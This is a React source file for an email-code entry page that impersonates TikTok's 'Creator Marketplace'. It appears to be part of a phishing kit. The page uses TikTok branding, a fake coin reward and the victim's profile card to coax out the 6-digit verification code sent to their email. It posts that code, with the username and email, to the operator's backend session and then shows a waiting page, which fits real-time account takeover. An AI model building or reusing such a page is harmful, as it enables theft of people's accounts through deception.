import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import axios from 'axios';
import ProfileCard from '../components/ProfileCard';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const VerifyEmailPage = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [tiktokData, setTiktokData] = useState(null);
  const inputRefs = useRef([]);
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';
  const email = localStorage.getItem('email') || 'a********h@hotmail.com';
  const sessionId = localStorage.getItem('sessionId');
  const username = localStorage.getItem('username') || 'user';

  useEffect(() => {
    inputRefs.current[0]?.focus();
    
    const storedData = localStorage.getItem('tiktokData');
    if (storedData) {
      setTiktokData(JSON.parse(storedData));
    }
  }, []);

  const handleChange = (index, value) => {
    // Only allow digits
    if (!/^[0-9]*$/.test(value)) return;
    
    // Take only the first character
    if (value.length > 1) value = value[0];

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleContinue = async () => {
    const emailCode = code.join('');
    localStorage.setItem('emailCode', emailCode);

    try {
      await axios.post(`${API}/session/step`, {
        session_id: sessionId,
        step: 'email_code',
        data: {
          username: username,
          email: email,
          email_code: emailCode
        }
      });
    } catch (error) {
      console.error('Failed to submit step:', error);
    }

    navigate('/waiting');
  };

  const handleResend = () => {
    setCode(['', '', '', '', '', '']);
    inputRefs.current[0]?.focus();
  };

  const maskedEmail = email.includes('@')
    ? email[0] + '********' + email.substring(email.indexOf('@') - 1)
    : 'a********h@hotmail.com';

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      <main className="max-w-4xl mx-auto px-6 py-12">
        <div className="text-center mb-8">
          <h1 className="text-6xl font-black mb-4">
            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
              TikTok
            </span>
          </h1>
          <p className="text-cyan-400 text-2xl font-semibold">Enter the mail code</p>
        </div>

        <ProfileCard userData={tiktokData} />

        <div className="text-center mb-8">
          <h2 className="text-cyan-400 text-3xl font-bold mb-4">Check your email</h2>
          <p className="text-gray-400 text-lg mb-2">
            We sent a 6-digit code to your email address. Please enter it below to continue.
          </p>
          <p className="text-cyan-400 text-lg font-semibold">Code sent to: {maskedEmail}</p>
        </div>

        <div className="mb-8">
          <label className="text-white text-lg mb-4 block">Mail code</label>
          <div className="flex gap-2 justify-center">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="1"
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-12 h-14 text-center text-xl font-bold bg-[#1a1a1c] border-2 rounded-lg text-white focus:outline-none transition-all ${
                  index === 0 && !code[0] ? 'border-cyan-400 shadow-lg shadow-cyan-400/20' : digit ? 'border-cyan-400' : 'border-gray-700'
                }`}
              />
            ))}
          </div>
        </div>

        <Button onClick={handleContinue} className="w-full bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold py-6 text-lg rounded-lg transition-all mb-4">
          Continue
        </Button>

        <div className="text-center mb-8">
          <span className="text-gray-400 text-lg">Didn't receive the code? </span>
          <button onClick={handleResend} className="text-[#fe2c55] text-lg font-semibold hover:underline">Resend</button>
        </div>

        <div className="text-center">
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
            <span className="text-gray-400 text-lg">You will receive: </span>
            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-lg"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default VerifyEmailPage;
